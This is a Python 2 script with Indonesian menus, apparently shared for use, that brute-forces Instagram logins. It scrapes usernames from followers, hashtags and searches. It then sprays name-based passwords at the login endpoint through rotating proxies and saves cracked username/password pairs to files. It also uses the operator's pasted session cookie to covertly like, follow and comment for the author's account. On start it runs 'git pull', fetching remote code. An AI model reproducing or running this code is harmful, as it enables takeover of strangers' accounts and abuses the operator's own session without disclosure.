# -*- coding: utf-8 -*-
import os,re,sys,json,time,random,requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from requests import Request, Session
from time import sleep
reload(sys)
sys.setdefaultencoding("utf-8")

# Kalo Mau Recode Izin Dulu!
# WhatsApp : 6283847921480

loop = 0
ok = []
cp = []

# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')

# Logo
___logo___ = ("""%s __  __ ____  _____
|  \/  | __ )|  ___|%s {au:rozhak}
%s| |\/| |  _ \| |_%s    {ig:@rozhak_official}
%s| |  | | |_) |  _|%s   {gh:github.com/rozhakxd}
%s|_|  |_|____/|_|%s     {yt:youtube.com/rozhakid}
"""%(M,P,M,P,U,P,U,P))
# Proxy
try:
    ___res = requests.get('https://raw.githubusercontent.com/RozhakXD/Premium/main/Data/proxy.txt').text
    open('Data/proxy.txt','w').write(___res)
except:
    exit("%s[%s!%s]%s Proxy Error"%(P,M,P,M))
# Requests Session
ses = Session()
# Login Cookie
def ___login___():
    os.system('clear')
    print(___logo___)
    print("%s[%s!%s]%s Anda Harus Memasukan Cookie Instagram, Sebaiknya Gunakan Akun Baru Untuk Login, Jika Anda Belum Tau Cara Mendapatkan Cookie Ketik {Open}\n"%(M,H,M,H))
    try:
        ___cookie___ = raw_input("%s[%s?%s]%s Cookie :%s "%(B,P,B,P,K))
        if ___cookie___ in ['open','Open']:
            print("%s[%s!%s]%s Anda Akan Diarahkan Ke Youtube"%(M,H,M,H))
            os.system("xdg-open https://youtu.be/u17ZQgSs3aY");exit()
        ___head = {'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Lenovo K33b36 Build/NRD90N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 41.0.0.13.92 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K33b36; K33b36; qcom; pt_BR; 103516666)','cookie': ___cookie___}
        ___vps = ___cookie___.split('ds_user_id=')[1];___user___ = ___vps.split(';')[0]
        open('Data/user.txt','w').write(___user___)
        __get = requests.get('https://i.instagram.com/api/v1/users/'+___user___+'/info/', headers=___head).json()['user']
        open('kuki.txt','w').write(___cookie___)
        print("%s[%s*%s]%s Welcome :%s %s"%(B,P,B,P,H,__get['full_name']))
        ___cookies___()
    except (KeyError):
        exit("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Headers
def ___header___():
    try:
        ___head ={'user-agent': 'Mozilla/5.0 (Linux; Android 10; HD1907 Build/QKQ1.190716.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 Instagram 119.0.0.33.147 Android (29/10; 420dpi; 1080x2291; OnePlus; HD1907; OnePlus7TTMO; qcom; en_US; 182747397)','cookie': open('kuki.txt','r').read()}
    except (IOError):
        print("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M));sleep(2);___login___()
    return ___head
# Cek Cookie
def ___cookies___():
    try:
        ___cookie___ = open('kuki.txt','r').read()
    except (IOError):
        print("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M));sleep(2)
        ___login___()
    try:
        ___cok = ___cookie___.split('sessionid=')[1]; ___kuki = ___cok.split(';')[0]
        ___teks = random.choice(['Hallo Bang 😍','Hai Bang Apa Kabar 😎','Izin Pake Scriptnya 😁','Mantap Bang 😘','Programmer Bang 🤔','Salam Kenal Bang 🤗'])
        ____head = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___kuki,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}
        ___data = {'comment_text': ___teks,'replied_to_comment_id':''}
        ___rex = ses.post('https://www.instagram.com/web/likes/2734317205115382629/like/',headers=____head).text
        ___rex2 = ses.post('https://www.instagram.com/web/friendships/5398218083/follow/',headers=____head).text # Jangan Di Ubah!
        ___rex3 = ses.post('https://www.instagram.com/web/comments/2734317205115382629/add/',headers=____head,data=___data).text
        if '"status":"ok"' in str(___rex):
            print("%s[%s*%s]%s Login Berhasil"%(P,H,P,H));sleep(2)
            ___menu___()
        else:
            print("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M));sleep(2)
            os.system('rm -rf kuki.txt');___login___()
    except (KeyError):
        os.system('rm -rf kuki.txt');exit("%s[%s!%s]%s Cookie Error"%(P,M,P,M))
# Daftar Menu
def ___menu___():
    os.system('clear')
    print(___logo___)
    try:
        ___cookie___ = open('kuki.txt','r').read()
    except (IOError):
        print("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M));sleep(2)
        ___login___()
    try:
        ___head = {'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Lenovo K33b36 Build/NRD90N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 41.0.0.13.92 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K33b36; K33b36; qcom; pt_BR; 103516666)','cookie': ___cookie___}
        __inf = requests.get('https://i.instagram.com/api/v1/users/'+open('Data/user.txt','r').read()+'/info/', headers=___head).json()['user']
        print("%s[%s•%s]%s Welcome :%s %s"%(H,P,H,P,K,__inf['full_name']))
        print("%s[%s•%s]%s User :%s %s"%(H,P,H,P,K,open('Data/user.txt','r').read()))
        print("%s[%s•%s]%s Follower :%s %s\n"%(H,P,H,P,K,__inf['follower_count']))
    except (KeyError):
        print("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
        os.system('rm -rf kuki.txt');sleep(2)
        ___login___()
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
    print("%s[%s1%s]%s Dump Username Dari Mengikuti"%(B,P,B,P))
    print("%s[%s2%s]%s Dump Username Dari Pengikut"%(B,P,B,P))
    print("%s[%s3%s]%s Dump Username Dari Beranda"%(B,P,B,P))
    print("%s[%s4%s]%s Dump Username Dari Hastag"%(B,P,B,P))
    print("%s[%s5%s]%s Dump Username Dari Search"%(B,P,B,P))
    print("%s[%s6%s]%s Dump Username Dari Query"%(B,P,B,P))
    print("%s[%s7%s]%s Dump User Dari Email"%(B,P,B,P))
    print("%s[%s8%s]%s Mulai Crack %s{%sFast%s}"%(B,H,B,H,B,K,B))
    print("%s[%s9%s]%s Lihat Hasil Crack"%(B,P,B,P))
    print("%s[%sA%s]%s Cara Menggunakan"%(B,P,B,P))
    print("%s[%s0%s]%s Hapus Cookies\n"%(B,P,B,P))
    ___menu___ = raw_input("%s[%s?%s]%s Choose :%s "%(H,P,H,P,K))
    if ___menu___ in ['1','01']:
        ___mengikuti___()
    elif ___menu___ in ['2','02']:
        ___pengikut___()
    elif ___menu___ in ['3','03']:
        ___beranda___()
    elif ___menu___ in ['4','04']:
        ___hastag___()
    elif ___menu___ in ['5','05']:
        ___search___()
    elif ___menu___ in ['6','06']:
        ___query___()
    elif ___menu___ in ['7','07']:
        ___email___()
    elif ___menu___ in ['8','08']:
       ___password___()
    elif ___menu___ in ['9','09']:
        print("\n%s[%s1%s]%s Lihat Hasil Results/Ok.txt"%(B,P,B,P))
        print("%s[%s2%s]%s Lihat Hasil Results/Cp.txt"%(B,P,B,P))
        print("%s[%s0%s]%s Keluar %s{%sExit%s}"%(B,P,B,P,B,H,B))
        ___hasil___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(H,P,H,P,K))
        if ___hasil___ in ['1','01']:
            os.system('cat Results/Ok.txt')
            exit("\n")
        elif ___hasil___ in ['2','02']:
            os.system('cat Results/Cp.txt')
            exit("\n")
        elif ___hasil___ in ['0','00']:
            exit()
        else:
            exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
    elif ___menu___ in ['a','A']:
        print("\n%s[%s!%s]%s Anda Akan Diarahkan Ke Facebook Atau Browser!"%(M,H,M,H))
        os.system("xdg-open https://youtu.be/u17ZQgSs3aY");exit()
        exit("%s[%s?%s]%s Ketik {./main}"%(P,H,P,H))
    elif ___menu___ in ['0','00']:
        os.system('rm -rf kuki.txt && Data/user.txt')
        exit("%s[%s!%s]%s Menghapus Cookie..."%(P,K,P,K))
    else:
        exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
# Dump Mengikuti
def ___mengikuti___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___user___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___user___[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            ___limit___ = raw_input("%s[%s?%s]%s Limit :%s "%(B,P,B,P,H))
            __res = requests.get('https://i.instagram.com/api/v1/users/'+___user___+'/info/', headers=___head).json()['user']
            ___nama = __res['full_name'].replace(' ','_') + '.txt'
            print("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
            print("%s[%s?%s]%s Total Mengikuti :%s %s"%(B,P,B,P,H,__res['following_count']))
            print("%s   "%(P))
        else:
            exit("%s[%s!%s]%s User Berupa Angka"%(P,M,P,M))
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ditemukan"%(P,M,P,M))
    try:
        __sep = ses.get('https://i.instagram.com/api/v1/friendships/'+___user___+'/following/?count='+___limit___, headers=___head)
        ___file = open('Dump/'+___nama, 'w')
        for z in json.loads(__sep.text)["users"]:
            ___file.write(z['username']+'<=>'+z['full_name']+'\n')
            print("\r"+z['username']+"<=>"+z['full_name'])
        ___file.close()
        print("\r%s                   "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
        print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
        raw_input("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Pengikut
def ___pengikut___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___user___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___user___[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            ___limit___ = raw_input("%s[%s?%s]%s Limit :%s "%(B,P,B,P,H))
            __res = requests.get('https://i.instagram.com/api/v1/users/'+___user___+'/info/', headers=___head).json()['user']
            ___nama = __res['full_name'].replace(' ','_') + '.txt'
            print("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
            print("%s[%s?%s]%s Total Pengikut :%s %s"%(B,P,B,P,H,__res['follower_count']))
            print("%s   "%(P))
        else:
            exit("%s[%s!%s]%s User Berupa Angka"%(P,M,P,M))
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ditemukan"%(P,M,P,M))
    try:
        __sep = ses.get('https://i.instagram.com/api/v1/friendships/'+___user___+'/followers/?count='+___limit___, headers=___head)
        ___file = open('Dump/'+___nama, 'w')
        for z in json.loads(__sep.text)["users"]:
            ___file.write(z['username']+'<=>'+z['full_name']+'\n')
            print("\r"+z['username']+"<=>"+z['full_name'])
        ___file.close()
        print("\r%s                   "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
        print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
        raw_input("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Beranda
def ___beranda___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___user___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___user___[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            __res = requests.get('https://i.instagram.com/api/v1/users/'+___user___+'/info/', headers=___head).json()['user']
            ___nama = __res['full_name'].replace(' ','_') + '.txt'
            print("%s[%s?%s]%s Nama :%s %s"%(B,P,B,P,H,__res['full_name']))
            print("%s   "%(P))
        else:
            exit("%s[%s!%s]%s User Berupa Angka"%(P,M,P,M))
    except (KeyError):
        exit("%s[%s!%s]%s User Tidak Ditemukan"%(P,M,P,M))
    try:
        __sep = ses.get("https://i.instagram.com/api/v1/feed/reels_tray/", headers=___head).json()
        ___file = open('Dump/'+___nama, 'w')
        for z in __sep['tray']:
            ___file.write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
            print("\r"+z['user']['username']+"<=>"+z['user']['full_name'])
        ___file.close()
        print("\r%s                   "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
        print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
        raw_input("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Hastag
def ___hastag___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___tag___ = raw_input("\n%s[%s?%s]%s Hastag :%s "%(B,P,B,P,H)).replace('#','')
        ___nama = raw_input("%s[%s?%s]%s File :%s "%(B,P,B,P,H))
        __sep = ses.get('https://i.instagram.com/api/v1/feed/tag/'+___tag___+'/?rank_token=caf8d67a-5140-4fcd-a795-e2a9047dc5d9', headers=___head).json()
        ___file = open('Dump/'+___nama, 'w')
        print("%s   "%(P))
        for z in __sep['ranked_items']:
            ___file.write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
            print("\r"+z['user']['username']+"<=>"+z['user']['full_name'])
        ___file.close()
        print("\r%s                   "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
        print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
        raw_input("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Search
def ___search___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___user___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        ___nama = ___user___+'.txt'
        print("%s   "%(P))
        if ___user___[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            __sep = ses.get('https://i.instagram.com/api/v1/fbsearch/accounts_recs/?target_user_id='+___user___+'&include_friendship_status=true',headers=___head).json()
            ___file = open('Dump/'+___nama, 'w')
            for z in __sep['users']:
                ___file.write(z['username']+'<=>'+z['full_name']+'\n')
                print("\r"+z['username']+"<=>"+z['full_name'])
            ___file.close()
            print("\r%s                   "%(P))
            print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
            print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
            print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
            raw_input("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Query
def ___query___():
    global ___header___,ses
    try:
        ___head = ___header___()
        ___nama = raw_input("\n%s[%s?%s]%s Query :%s "%(B,P,B,P,H)).replace(' ','')
        ___limit___ = raw_input("%s[%s?%s]%s Limit :%s "%(B,P,B,P,H))
        __sep = ses.get('https://www.instagram.com/web/search/topsearch/?context=blended&query='+___nama+'&rank_token=0.3953592318270893&count='+___limit___, headers=___head).json()
        ___file = open('Dump/'+___nama+'.txt', 'w')
        print("%s   "%(P))
        for z in __sep['users']:
            ___file.write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
            print("\r"+z['user']['username']+"<=>"+z['user']['full_name'])
        ___file.close()
        print("\r%s                   "%(P))
        print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
        print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama+'.txt','r').readlines())))
        print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama+'.txt'))
        raw_input("%s[%sKembali%s]"%(K,P,K));___menu___()
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Dump Email
def ___email___():
    try:
        ___user___ = raw_input("\n%s[%s?%s]%s Nama :%s "%(B,P,B,P,H)).replace(' ','')
        ___nama = ___user___+'.txt'
        ___limit___ = int(raw_input("%s[%s?%s]%s Limit :%s "%(B,P,B,P,H)))
        if ___limit___ >= 1001:
            exit("%s[%s!%s]%s Maksimal 1000"%(P,M,P,M))
        ___email___ = raw_input("%s[%s?%s]%s Domain :%s "%(B,P,B,P,H))
        print("%s   "%(P))
        if ___email___ in ['@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com']:
            ___file = open('Dump/'+___nama, 'w')
            for z in range(___limit___):
                ___nomor = random.randint(1, 999)
                email___ = ___user___+str(___nomor)+___email___+'<=>'+___user___+' '+str(___nomor)
                ___file.write(email___+'\n')
                print('\r'+email___)
            ___file.close()
            print("\r%s                   "%(P))
            print("%s[%s*%s]%s Selesai..."%(H,P,H,P))
            print("%s[%s?%s]%s Total User :%s %s"%(H,P,H,P,K,len(open('Dump/'+___nama,'r').readlines())))
            print("%s[%s?%s]%s File Tersimpan Di :%s Dump/%s"%(H,P,H,P,K,___nama))
            raw_input("%s[%sKembali%s]"%(K,P,K));___menu___()
        else:
            exit("%s[%s!%s]%s Domain : @gmail.com,@yahoo.com,@hotmail.com,@email.com,@mail.com,@outlok.com,@yandex.com"%(P,M,P,M))
    except (KeyError):
        exit("%s[%s!%s]%s Dump Gagal"%(P,M,P,M))
# Pilih Password
def ___password___():
    print("\n%s[%s1%s]%s Gunakan Password %s{%sName123,Name12345%s}"%(B,P,B,P,H,P,H))
    print("%s[%s2%s]%s Gunakan Password %s{%sName,Name123,Name12345%s}"%(B,P,B,P,H,P,H))
    print("%s[%s3%s]%s Gunakan Password %s{%sName,Name123,Name1234,Name12345,Name123456%s}"%(B,P,B,P,H,P,H))
    print("%s[%s4%s]%s Gunakan Password Manual %s{%s>5%s}"%(B,P,B,P,H,P,H))
    ___pilih___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(H,P,H,P,K))
    if ___pilih___ in ['4','04']:
        print("%s[%s!%s]%s Gunakan (,) Untuk Password Yang Berbeda"%(M,P,M,P))
        pws = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,K)).split(',')
        if pws <=5:
            exit("%s[%s!%s]%s Password Lebih Dari 6 Karakter"%(P,M,P,M))
    try:
        ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,K))
        ___list = open(___file___,'r').read().splitlines()
    except (IOError):
        exit("%s[%s!%s]%s File Tidak Ada"%(P,M,P,M))
    print("\n%s[%s•%s]%s Hasil Ok Tersimpan Di :%s Results/Ok.txt"%(B,P,B,P,H))
    print("%s[%s•%s]%s Hasil Cp Tersimpan Di :%s Results/Cp.txt\n"%(B,P,B,P,H))
    with ThreadPoolExecutor(max_workers=10) as (hayuk):
        for v in ___list:
            user, name = v.split('<=>')
            z = name.split(' ')
            if ___pilih___ in ['1','01']:
                pwx = [z[0]+'123', z[0]+'12345']
            elif ___pilih___ in ['2','02']:
                pwx = [name.replace(' ',''), z[0]+'123', z[0]+'12345']
            elif ___pilih___ in ['3','03']:
                pwx = [name.replace(' ',''), z[0]+'123', z[0]+'1234', z[0]+'12345', z[0]+'123456']
            elif ___pilih___ in ['4','04']:
                pwx = pws
            else:
                pwx = [name.replace(' ',''), z[0]+'123', z[0]+'12345']
            hayuk.submit(___crack___, ___list, user, pwx)
    exit("\r%s[%sSelesai%s]%s                        "%(H,P,H,P))
# Crack Instagram
def ___crack___(total,user,pwx):
    global loop, ses, ok, cp
    try:
        ua = random.choice(open("Data/ua.txt","r").read().splitlines())
    except (IOError):
        ua = ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s     "%(loop, len(total), len(ok), len(cp))
    ); sys.stdout.flush();sleep(2)
    try:
        for pw in pwx:
            pw = pw.lower()
            proxy = random.choice(open("Data/proxy.txt","r").read().splitlines())
            ___head ={'user-agent': 'Mozilla/5.0 (Linux; Android 10; HD1907 Build/QKQ1.190716.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 Instagram 119.0.0.33.147 Android (29/10; 420dpi; 1080x2291; OnePlus; HD1907; OnePlus7TTMO; qcom; en_US; 182747397)','cookie': open('kuki.txt','r').read()}
            header = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.8',
                'Connection': 'keep-alive',
                'Content-Length': '0',
                'Host': 'www.instagram.com',
                'Referer': 'https://www.instagram.com/',
                'User-Agent': ua,
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest'
                }
            ses.headers.update(header)
            ses.cookies.update({
                'sessionid': '', 'mid': '', 'ig_pr': '1',
                'ig_vw': '1920', 'csrftoken': '',
                's_network': '', 'ds_user_id': ''
                })
            ses.get('https://www.instagram.com/web/__mid')
            ses.headers.update({'X-CSRFToken': ses.cookies.get_dict()['csrftoken']})
            enc_pass = '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()), pw)
            data_post = {
                "username": user,
                "enc_password": enc_pass
                }
            req = ses.post("https://www.instagram.com/accounts/login/ajax/", headers=header, data=data_post, proxies={'http': 'socks4://'+proxy}, allow_redirects=True).json()
            if 'userId' in str(req):
                try:
                    __vox = requests.get('https://www.instagram.com/'+user+'/?__a=1', headers=___head).json()['graphql']['user']
                    nm = __vox['full_name']
                    mk = __vox['edge_followed_by']['count']
                except (KeyError, IOError):
                    nm = ' -'
                    mk = ' -'
                except:pass
                print("\r%s[%s✔%s]%s Status :%s Success               "%(B,H,B,P,H))
                print("%s[>] Nama : %s"%(P,nm))
                print("%s[>] Pengikut : %s"%(P,mk))
                print("%s[>] Username : %s"%(P,user))
                print("%s[>] Password : %s\n"%(P,pw))
                ok.append("%s|%s"%(user,pw))
                open('Results/Ok.txt','a').write("%s|%s"%(user,pw))
            elif 'checkpoint' in str(req):
                try:
                    __vox = requests.get('https://www.instagram.com/'+user+'/?__a=1', headers=___head).json()['graphql']['user']
                    nm = __vox['full_name']
                    mk = __vox['edge_followed_by']['count']
                except (KeyError, IOError):
                    nm = ' -'
                    mk = ' -'
                except:pass
                print("\r%s[%s✘%s]%s Status :%s Checkpoint               "%(B,K,B,P,K))
                print("%s[>] Nama : %s"%(P,nm))
                print("%s[>] Pengikut : %s"%(P,mk))
                print("%s[>] Username : %s"%(P,user))
                print("%s[>] Password : %s\n"%(P,pw))
                cp.append("%s|%s"%(user,pw))
                open('Results/Cp.txt','a').write("%s|%s"%(user,pw))
            elif 'Please wait' in str(req) or 'Try Again Later' in str(req):
                print("\r%s[%s!%s]%s Hidupkan Mode Pesawat 2 Detik"%(P,M,P,M)),
                sys.stdout.flush();sleep(5)
                ___crack___(total,user,pwx)
            else:
                continue
        loop +=1
    except (ConnectionError):
        print("\r%s[%s!%s]%s Koneksi Error                "%(P,K,P,K)),
        sys.stdout.flush();sleep(3)
        ___crack___(total,user,pwx)
    except:
        pass

if __name__=='__main__':
    os.system('git pull')
    raw_input("\n\x1b[1;97m[\x1b[1;93m!\x1b[1;97m]\x1b[1;93m Gunakan Script Ini Sewajarnya Saja Author Tidak Bertanggung Jawab Jika Anda Menyalahgunakan Script Ini!\n\n\x1b[1;97m[\x1b[1;92m?\x1b[1;97m]\x1b[1;92m Dengan Menekan Enter Berarti Anda Menyetujui Syarat & Ketentuan Yang Ada!\x1b[1;97m ")
    ___menu___()
